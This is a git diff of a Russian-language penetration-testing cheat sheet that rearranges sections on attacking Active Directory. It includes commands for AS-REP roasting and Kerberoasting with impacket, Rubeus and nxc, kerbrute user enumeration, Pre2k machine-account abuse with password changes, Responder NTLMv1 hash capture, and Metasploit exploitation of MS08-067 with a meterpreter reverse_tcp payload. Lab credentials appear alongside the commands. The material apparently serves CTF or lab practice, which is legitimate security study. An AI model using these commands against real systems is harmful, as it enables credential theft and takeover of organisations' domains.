@@ -64,6 +64,9 @@
 	    172.16.0.0/12 (маска 255.240.0.0)
 	    192.168.0.0/16 (маска 255.255.0.0)
 
+		поиск все машин	nxc smb 192.168.50.0/24 
+		nslookup -type=SRV _ldap._tcp.dc._msdcs.game.ru 192.168.50.100 (один из котроллеров для поиска всех котроллеров)
+
   		fping -ag 10.129.203.0/24 2>/dev/null
   		sudo netdiscover -r 10.129.203.0/24
 		sudo netdiscover -i eth0
@@ -90,6 +93,9 @@
 		grep "open" masscan_results.txt | awk -F" " '{print $4}' | awk -F"/" '{print $1}' > nmap_targets.txt
 		# Затем использовать с Nmap
 		nmap -sV -sC -iL nmap_targets.txt -oA scan_results
+
+
+		
 
 # Domain
 	1. Основная самая лучшая справка по Active Directory:
@@ -142,12 +148,6 @@
 
 # DOMAIN
 
-
-# Check list domain
-				
-		поиск все машин	nxc smb 192.168.50.0/24 
-		nslookup -type=SRV _ldap._tcp.dc._msdcs.game.ru 192.168.50.100 (один из котроллеров для поиска всех котроллеров)
-		
   # (asreproasting)	
   		nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
 
@@ -169,9 +169,37 @@
   		-----Kerberoasting without credentials
 
   		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
-		
+		* not_preauth
+
+  		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
+		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
+  		-----Kerberoasting without credentials
+
+  		python3 -m venv impacket-fork
+		source ./impacket-fork/bin/activate
+		git clone https://github.com/ThePorgs/impacket.git
+		cd impacket
+		python3 setup.py install
+
+		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
 # (керберостинг)
-		
+		* spn (Kerberoasting)
+  
+		----ntlm
+
+  		impacket-GetUserSPNs -dc-ip 192.168.50.110 vd.local/arly.ayn:Password123 -request
+
+  		-----kerberos
+  
+		impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt
+		export KRB5CCNAME=ryan.naylor.ccache
+		impacket-GetUserSPNs -dc-ip 10.10.11.76 -dc-host dc.voleur.htb voleur.htb/ryan.naylor -k -no-pass -request
+				---nxc -делает все
+  		nxc ldap dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --kerberoasting kerberoastables.txt
+
+  		.\Rubeus.exe kerberoast /stats
+
+  		.\Rubeus.exe kerberoast /nowrap /tgtdeleg
 		nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
 		
 		----ntlm
@@ -436,10 +464,18 @@
   		sudo net time set -S 10.10.11.181
   		sudo ntpdate
 		sudo ntpdate -s 10.10.10.248 
-* Pre2k
+# Pre2k
 
   		nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k
   
+		git clone https://github.com/garrettfoster13/pre2k.git
+		cd pre2k
+		ls
+		pipx install .
+		pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
+		nxc ldap 192.168.1.48 -u raj –p Password@1 -M pre2k
+		impacket-changepasswd ignite. расположение /DEMO$@ 192.168 . 1 . 48  -newpass  'Password@987'  -p rpc-samr
+		
 * Timeroast
 
   	  nxc smb rustykey.htb -M timeroast 
@@ -494,15 +530,17 @@
 		nfs> mount MirageReports
 		nfs> ls 
 
-
-   * user found
+# user found
 		- with Kerbrute
 
 		https://github.com/insidetrust/statistically-likely-usernames (списки юзеров)
 		sudo git clone https://github.com/ropnop/kerbrute.git (репозиторий кербрут)
 
   		kerbrute userenum --dc 172.16.5.5 -d INLANEFREIGHT.LOCAL /opt/jsmith.txt (пример комманды)
-
+		
+		* kerbrute
+    		
+		~/kerbrute_linux_amd64 userenum users.txt --dc 192.168.50.110 -d vd.local
  		- with crackmapexec
   
 		crackmapexec smb 10.10.10.10 -p "anonymous" -p '' --rid-brute
@@ -518,22 +556,8 @@
   		sudo responder -I ens224 -wdF
   		(ответ собирается в /usr/share/responder/logs)
 		/usr/share/responder/Responder.conf
-* kerbrute
-    		
-		~/kerbrute_linux_amd64 userenum users.txt --dc 192.168.50.110 -d vd.local
-* not_preauth
 
-  		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
-		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
-  		-----Kerberoasting without credentials
 
-  		python3 -m venv impacket-fork
-		source ./impacket-fork/bin/activate
-		git clone https://github.com/ThePorgs/impacket.git
-		cd impacket
-		python3 setup.py install
-
-		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
 
 * validate creds
 
@@ -589,23 +613,7 @@
 		cd /home/max/BloodHound-linux-x64_new && ./BloodHound --no-sandbox
   
   		cat 20240201210210_users.json|jq '.data[].Properties | .samaccountname + ":" + .description' -r
-* spn (Kerberoasting)
-  
-		----ntlm
 
-  		impacket-GetUserSPNs -dc-ip 192.168.50.110 vd.local/arly.ayn:Password123 -request
-
-  		-----kerberos
-  
-		impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt
-		export KRB5CCNAME=ryan.naylor.ccache
-		impacket-GetUserSPNs -dc-ip 10.10.11.76 -dc-host dc.voleur.htb voleur.htb/ryan.naylor -k -no-pass -request
-				---nxc -делает все
-  		nxc ldap dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --kerberoasting kerberoastables.txt
-
-  		.\Rubeus.exe kerberoast /stats
-
-  		.\Rubeus.exe kerberoast /nowrap /tgtdeleg
 	
 
 * DCOM Abusing
@@ -1809,18 +1817,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 	systeminfo | find "KB3011780" (проверить обновление)
 
-# Уязвимость MS08-067
-	nmap --script smb-vuln-ms08-067 -p445 <целевой IP-адрес>		(но может завалить систему)
 
-	msfconsole
-	search ms08-067 checker или search ms08-067 scanner				(просто проверить на наличие уязвимости)
-	
-	search ms08-067
-	use exploit/windows/smb/ms08_067_netapi
-	show options
-	set Rhosts
-	set PAYLOAD windows/meterpreter/reverse_tcp
-	exploit
 	
 # Недостатки канального уровня (sudo yersinia -I)
 	При исследовании сетевого трафика были выявлены сетевые пакеты инфраструктурных протоколов CDP, VTP и STP. Данные протоколы имеют ряд недостатков. Протокол CDP раскрывает информацию о сетевом оборудовании, сетевых адресах и имени маршрутизатора
@@ -1828,17 +1825,10 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	Для протокола VTP рекомендуется использовать протокол VTPv3.
 	
 # Перебор пользователей через ssh
+	в метасплойт
 	scanner/ssh/ssh_enumusers
 
-# Pre2k
 
-	git clone https://github.com/garrettfoster13/pre2k.git
-	cd pre2k
-	ls
-	pipx install .
-	pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
-	nxc ldap 192.168.1.48 -u raj –p Password@1 -M pre2k
-	impacket-changepasswd ignite. расположение /DEMO$@ 192.168 . 1 . 48  -newpass  'Password@987'  -p rpc-samr
 
 
 # Get Kyocera creds (TCP-порт 9091)
@@ -1939,7 +1929,19 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		sudo sed -i 's/ Challenge = Random/ Challenge = 1122334455667788/g' /usr/share/responder/Responder.conf
 		sudo responder -I eth0 --lm --disable-ess -v
 		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
-		
+
+# Уязвимость MS08-067
+	nmap --script smb-vuln-ms08-067 -p445 <целевой IP-адрес>		(но может завалить систему)
+
+	msfconsole
+	search ms08-067 checker или search ms08-067 scanner				(просто проверить на наличие уязвимости)
+	
+	search ms08-067
+	use exploit/windows/smb/ms08_067_netapi
+	show options
+	set Rhosts
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	exploit		
 # NoPac
 	git clone https://github.com/Ridter/noPac.git
 	netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ -проверяем машина квота
